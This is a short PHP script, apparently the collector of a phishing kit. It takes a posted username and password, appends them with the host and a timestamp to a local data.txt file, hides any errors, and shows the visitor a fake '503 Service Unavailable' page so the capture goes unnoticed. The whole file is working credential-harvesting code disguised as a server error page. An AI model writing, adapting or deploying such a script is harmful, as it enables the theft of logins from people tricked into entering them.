<?php
$host = $_SERVER['HTTP_HOST'];
$today = date("Y-m-d H:i:s");

if (isset($_POST['user']) && !empty($_POST['user'])) {
	$user = stripslashes($_POST['user']);
	$pass = stripslashes($_POST['pass']);
	$user = htmlspecialchars($user, ENT_QUOTES);
	$pass = htmlspecialchars($pass, ENT_QUOTES);
	
	$content = $today . "  --  " . $host . "  --  " . $user . "  --  " . $pass;
	
	$filed = @fopen("data.txt", "a+");
	@fwrite($filed, "$content\n");
	@fclose($filed);
}
?>

<html><body>
<h1>503 Service Unavailable</h1>
</body></html>
